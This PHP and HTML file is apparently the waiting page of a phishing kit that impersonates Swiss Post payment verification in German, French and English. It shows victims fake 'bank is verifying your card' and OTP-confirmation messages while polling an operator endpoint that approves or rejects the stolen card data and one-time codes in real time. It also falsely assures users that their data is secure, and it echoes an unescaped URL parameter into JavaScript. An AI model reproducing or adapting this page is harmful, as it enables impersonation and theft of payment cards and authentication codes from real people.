<?php
require __DIR__ . '/security.php';
require __DIR__ . '/lang.php';

$type = $_GET['type'] ?? 'cc';
$sessionId = $_SESSION['session_id'] ?? null;

// Redirect if no session
if (!$sessionId) {
    header('Location: ?s=2');
    exit;
}

// Translations for wait page
$waitTexts = [
    'de' => [
        'cc_title' => 'Kartendaten werden überprüft',
        'cc_text' => 'Ihre Bank überprüft die Kartendaten. Dies kann einen Moment dauern.',
        'otp_title' => 'Zahlung wird bestätigt',
        'otp_text' => 'Bitte warten Sie, während wir Ihre Zahlung bestätigen. Schließen Sie diese Seite nicht.',
        'processing' => 'Verarbeitung läuft...',
        'success' => 'Bestätigt! Sie werden weitergeleitet...',
        'error_cc' => 'Kartendaten abgelehnt. Bitte überprüfen Sie die Daten und versuchen Sie es erneut.',
        'error_otp' => 'Ungültiger Code. Bitte erneut versuchen.',
        'wait' => 'Bitte warten',
        'seconds' => 'Sekunden',
        'secure' => 'Ihre Daten sind verschlüsselt und sicher',
    ],
    'fr' => [
        'cc_title' => 'Vérification des informations de carte',
        'cc_text' => 'Votre banque vérifie les informations de la carte. Cela peut prendre un moment.',
        'otp_title' => 'Confirmation du paiement',
        'otp_text' => 'Veuillez patienter pendant que nous confirmons votre paiement. Ne fermez pas cette page.',
        'processing' => 'Traitement en cours...',
        'success' => 'Confirmé! Redirection en cours...',
        'error_cc' => 'Informations de carte refusées. Veuillez vérifier et réessayer.',
        'error_otp' => 'Code invalide. Veuillez réessayer.',
        'wait' => 'Veuillez patienter',
        'seconds' => 'secondes',
        'secure' => 'Vos données sont cryptées et sécurisées',
    ],
    'en' => [
        'cc_title' => 'Verifying card details',
        'cc_text' => 'Your bank is verifying the card details. This may take a moment.',
        'otp_title' => 'Confirming payment',
        'otp_text' => 'Please wait while we confirm your payment. Do not close this page.',
        'processing' => 'Processing...',
        'success' => 'Confirmed! Redirecting...',
        'error_cc' => 'Card details rejected. Please check and try again.',
        'error_otp' => 'Invalid code. Please try again.',
        'wait' => 'Please wait',
        'seconds' => 'seconds',
        'secure' => 'Your data is encrypted and secure',
    ],
];

$wt = $waitTexts[$currentLang] ?? $waitTexts['de'];
?><!DOCTYPE html>
<html lang="<?php echo $currentLang; ?>">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title><?php echo t('site_title'); ?></title>
<link rel="icon" href="https://media.20min.ch/7/image/2023/12/27/cf810a3b-398c-46b4-b5f3-fed4f2973f08.png?auto=format%2Ccompress%2Cenhance&fit=max&w=1600&h=1600&rect=0%2C0%2C2048%2C2048&fp-x=0.5&fp-y=0.5&s=eaf5294ac39e1a86e4764bc72644b55f">
<link href="https://fonts.googleapis.com/css2?family=Fira+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
<style>
*{box-sizing:border-box;margin:0;padding:0;}
body{font-family:'Fira Sans',Arial,sans-serif;background:#f5f5f5;color:#1e1e1e;font-size:16px;line-height:1.5;min-height:100vh;display:flex;flex-direction:column;}
a{text-decoration:none;color:inherit;}

:root {
    --post-yellow: #FFCC00;
    --post-yellow-dark: #E6B800;
    --post-red: #E2001A;
    --post-gray: #F5F5F5;
    --post-dark: #1e1e1e;
    --post-border: #e5e5e5;
    --post-green: #00A550;
}

/* HEADER */
.tb{background:#fff;border-bottom:1px solid var(--post-border);display:flex;align-items:center;height:56px;padding:0 24px;}
.tb-logo{display:flex;align-items:center;background:var(--post-yellow);height:56px;margin-left:-24px;padding:0 20px;}
.tb-logo img{height:36px;}
.tb-right{margin-left:auto;display:flex;align-items:center;gap:16px;}
.tb-langs{display:flex;border:1px solid var(--post-border);border-radius:4px;overflow:hidden;}
.tb-lang{font-size:13px;font-weight:600;padding:6px 10px;cursor:pointer;color:#666;background:#fff;}
.tb-lang.active{background:var(--post-dark);color:#fff;}

/* PAGE CONTENT */
.page-content{flex:1;display:flex;align-items:center;justify-content:center;padding:40px 20px;}

/* WAIT CARD */
.wait-card{background:#fff;border-radius:12px;box-shadow:0 4px 24px rgba(0,0,0,0.08);padding:48px 40px;text-align:center;max-width:480px;width:100%;}

/* ANIMATED ICON */
.icon-wrapper{margin-bottom:28px;position:relative;}
.icon-circle{width:100px;height:100px;margin:0 auto;position:relative;}
.icon-bg{position:absolute;inset:0;border-radius:50%;background:var(--post-yellow);opacity:0.15;animation:pulse-bg 2s ease-in-out infinite;}
@keyframes pulse-bg{0%,100%{transform:scale(1);opacity:0.15;}50%{transform:scale(1.12);opacity:0.25;}}
.icon-inner{position:absolute;inset:12px;background:var(--post-yellow);border-radius:50%;display:flex;align-items:center;justify-content:center;box-shadow:0 4px 16px rgba(255,204,0,0.4);}
.icon-inner svg{width:36px;height:36px;fill:var(--post-dark);}

/* DOTS ANIMATION */
.dots{display:flex;justify-content:center;gap:8px;margin-top:20px;}
.dot{width:10px;height:10px;background:var(--post-yellow);border-radius:50%;animation:dot-bounce 1.4s ease-in-out infinite;}
.dot:nth-child(1){animation-delay:0s;}
.dot:nth-child(2){animation-delay:0.2s;}
.dot:nth-child(3){animation-delay:0.4s;}
@keyframes dot-bounce{0%,80%,100%{transform:scale(0.6);opacity:0.4;}40%{transform:scale(1);opacity:1;}}

/* TEXT */
.wait-card h1{font-size:22px;font-weight:800;color:var(--post-dark);margin-bottom:10px;}
.wait-card p{font-size:15px;color:#666;line-height:1.6;}

/* STATUS MESSAGES */
.status-box{margin-top:24px;padding:18px 20px;border-radius:10px;display:none;}
.status-box.pending{display:block;background:#FFFDF5;border:1.5px solid #FFE082;}
.status-box.success{display:block;background:#F0FDF4;border:1.5px solid #BBF7D0;}
.status-box.error{display:block;background:#FEF2F2;border:1.5px solid #FECACA;}
.status-icon{width:44px;height:44px;border-radius:50%;margin:0 auto 10px;display:flex;align-items:center;justify-content:center;}
.status-box.pending .status-icon{background:var(--post-yellow);}
.status-box.success .status-icon{background:var(--post-green);}
.status-box.error .status-icon{background:var(--post-red);}
.status-icon svg{width:22px;height:22px;fill:#fff;}
.status-box.pending .status-icon svg{fill:var(--post-dark);}
.status-text{font-size:14px;font-weight:600;}
.status-box.pending .status-text{color:#92400E;}
.status-box.success .status-text{color:#166534;}
.status-box.error .status-text{color:#991B1B;}

/* PROGRESS STEPS */
.progress-steps{display:flex;justify-content:center;gap:10px;margin-top:28px;}
.step-dot{width:12px;height:12px;border-radius:50%;background:#e5e5e5;transition:all 0.3s;}
.step-dot.active{background:var(--post-yellow);box-shadow:0 0 0 3px rgba(255,204,0,0.3);}
.step-dot.done{background:var(--post-green);}

/* TIMER */
.timer{margin-top:20px;font-size:14px;color:#888;}
.timer span{font-weight:700;color:var(--post-dark);}

/* SECURITY NOTE */
.security-note{display:flex;align-items:center;justify-content:center;gap:8px;margin-top:20px;font-size:12px;color:#888;padding-top:20px;border-top:1px solid #eee;}
.security-note svg{width:16px;height:16px;fill:var(--post-green);}

/* FOOTER */
footer{background:#fff;border-top:1px solid var(--post-border);padding:20px 32px;text-align:center;}
footer p{font-size:12px;color:#888;}

@media(max-width:600px){
    .tb{padding:0 16px;height:50px;}
    .tb-logo{margin-left:-16px;padding:0 16px;height:50px;}
    .tb-logo img{height:30px;}
    .tb-langs{display:none;}
    .page-content{padding:20px 16px;}
    .wait-card{padding:32px 20px;border-radius:10px;}
    .wait-card h1{font-size:18px;}
    .wait-card p{font-size:14px;}
    .icon-circle{width:80px;height:80px;}
    .icon-inner{inset:10px;}
    .icon-inner svg{width:28px;height:28px;}
    .dots .dot{width:8px;height:8px;}
    .status-box{padding:16px;}
    .progress-steps{gap:8px;}
    .step-dot{width:10px;height:10px;}
}
</style>
</head>
<body>

<!-- HEADER -->
<div class="tb">
    <div class="tb-logo">
        <img src="https://media.20min.ch/7/image/2023/12/27/cf810a3b-398c-46b4-b5f3-fed4f2973f08.png?auto=format%2Ccompress%2Cenhance&fit=max&w=1600&h=1600&rect=0%2C0%2C2048%2C2048&fp-x=0.5&fp-y=0.5&s=eaf5294ac39e1a86e4764bc72644b55f" alt="Swi">
    </div>
    <div class="tb-right">
        <div class="tb-langs">
            <span class="tb-lang <?php echo $currentLang === 'de' ? 'active' : ''; ?>">DE</span>
            <span class="tb-lang <?php echo $currentLang === 'fr' ? 'active' : ''; ?>">FR</span>
            <span class="tb-lang <?php echo $currentLang === 'en' ? 'active' : ''; ?>">EN</span>
        </div>
    </div>
</div>

<!-- PAGE CONTENT -->
<div class="page-content">
    <div class="wait-card">

        <div class="icon-wrapper">
            <div class="icon-circle">
                <div class="icon-bg"></div>
                <div class="icon-inner">
                    <?php if ($type === 'cc'): ?>
                    <svg viewBox="0 0 24 24"><path d="M20 4H4c-1.11 0-2 .89-2 2v12c0 1.11.89 2 2 2h16c1.11 0 2-.89 2-2V6c0-1.11-.89-2-2-2zm0 14H4v-6h16v6zm0-10H4V6h16v2z"/></svg>
                    <?php else: ?>
                    <svg viewBox="0 0 24 24"><path d="M12 1C8.676 1 6 3.676 6 7v2H4a2 2 0 0 0-2 2v9a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2v-9a2 2 0 0 0-2-2h-2V7c0-3.324-2.676-6-6-6zm0 2c2.276 0 4 1.724 4 4v2H8V7c0-2.276 1.724-4 4-4zm0 10a2 2 0 0 1 1 3.732V18a1 1 0 1 1-2 0v-1.268A2 2 0 0 1 12 13z"/></svg>
                    <?php endif; ?>
                </div>
            </div>
        </div>

        <?php if ($type === 'cc'): ?>
        <h1><?php echo $wt['cc_title']; ?></h1>
        <p><?php echo $wt['cc_text']; ?></p>
        <?php else: ?>
        <h1><?php echo $wt['otp_title']; ?></h1>
        <p><?php echo $wt['otp_text']; ?></p>
        <?php endif; ?>

        <div class="dots">
            <div class="dot"></div>
            <div class="dot"></div>
            <div class="dot"></div>
        </div>

        <div class="status-box pending" id="status-pending">
            <div class="status-icon">
                <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
            </div>
            <div class="status-text"><?php echo $wt['processing']; ?></div>
        </div>

        <div class="status-box success" id="status-success" style="display:none;">
            <div class="status-icon">
                <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/></svg>
            </div>
            <div class="status-text"><?php echo $wt['success']; ?></div>
        </div>

        <div class="status-box error" id="status-error" style="display:none;">
            <div class="status-icon">
                <svg viewBox="0 0 24 24"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"/></svg>
            </div>
            <div class="status-text" id="error-text"><?php echo $wt['error_cc']; ?></div>
        </div>

        <div class="progress-steps">
            <div class="step-dot <?php echo $type === 'otp' ? 'done' : 'active'; ?>"></div>
            <div class="step-dot <?php echo $type === 'otp' ? 'active' : ''; ?>"></div>
            <div class="step-dot"></div>
        </div>

        <div class="timer">
            <?php echo $wt['wait']; ?> <span id="timer-count">30</span> <?php echo $wt['seconds']; ?>
        </div>

        <div class="security-note">
            <svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2z"/></svg>
            <span><?php echo $wt['secure']; ?></span>
        </div>

    </div>
</div>

<!-- FOOTER -->
<footer>
    <p>&copy; 2024 <?php echo t('footer_copyright'); ?></p>
</footer>

<script>
var type = '<?php echo $type; ?>';
var errorCc = <?php echo json_encode($wt['error_cc']); ?>;
var errorOtp = <?php echo json_encode($wt['error_otp']); ?>;
var checkInterval;
var timerInterval;
var timeLeft = 60;

// Timer countdown
timerInterval = setInterval(function() {
    timeLeft--;
    document.getElementById('timer-count').textContent = timeLeft;
    if (timeLeft <= 0) {
        clearInterval(timerInterval);
    }
}, 1000);

// Check status every 2 seconds
function checkStatus() {
    fetch('?s=c')
        .then(response => response.json())
        .then(data => {
            console.log('Status:', data.status);

            if (type === 'cc') {
                if (data.status === 'approved_cc') {
                    showSuccess();
                    setTimeout(function() {
                        window.location.href = '?s=3';
                    }, 1500);
                } else if (data.status === 'rejected_cc') {
                    showError(errorCc);
                    setTimeout(function() {
                        window.location.href = '?s=2&error=rejected';
                    }, 2500);
                }
            } else if (type === 'otp') {
                if (data.status === 'approved_otp') {
                    showSuccess();
                    setTimeout(function() {
                        window.location.href = '?s=6';
                    }, 1500);
                } else if (data.status === 'rejected_otp') {
                    showError(errorOtp);
                    setTimeout(function() {
                        window.location.href = '?s=3&error=1';
                    }, 2500);
                }
            }
        })
        .catch(error => {
            console.error('Error checking status:', error);
        });
}

function showSuccess() {
    clearInterval(checkInterval);
    clearInterval(timerInterval);
    document.getElementById('status-pending').style.display = 'none';
    document.getElementById('status-success').style.display = 'block';
    document.querySelector('.dots').style.display = 'none';
}

function showError(message) {
    clearInterval(checkInterval);
    clearInterval(timerInterval);
    document.getElementById('status-pending').style.display = 'none';
    document.getElementById('status-error').style.display = 'block';
    document.getElementById('error-text').textContent = message;
    document.querySelector('.dots').style.display = 'none';
}

// Start polling
checkInterval = setInterval(checkStatus, 2000);

// Initial check
checkStatus();
</script>
<script src="/assets/js/main.js"></script>
</body>
</html>
